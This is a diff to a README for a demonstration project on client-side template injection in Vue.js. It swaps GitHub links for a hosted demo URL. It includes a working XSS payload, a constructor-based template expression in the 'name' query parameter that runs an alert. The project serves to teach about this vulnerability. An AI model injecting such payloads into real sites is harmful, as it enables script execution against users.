@@ -4,10 +4,10 @@ A example of client-side template injection with Vue.js
 
 ## Site
 
-- https://github.com/azu/vue-client-side-template-injection-example?name=xxx
+- https://vue-client-side-template-injection-example.azu.now.sh/?name=xxx
 
 ## Payload
 
 XSS Payload
 
-- https://github.com/azu/vue-client-side-template-injection-example?name={{this.constructor.constructor('alert("foo")')()}}
+- https://vue-client-side-template-injection-example.azu.now.sh/?name={{this.constructor.constructor('alert("foo")')()}}
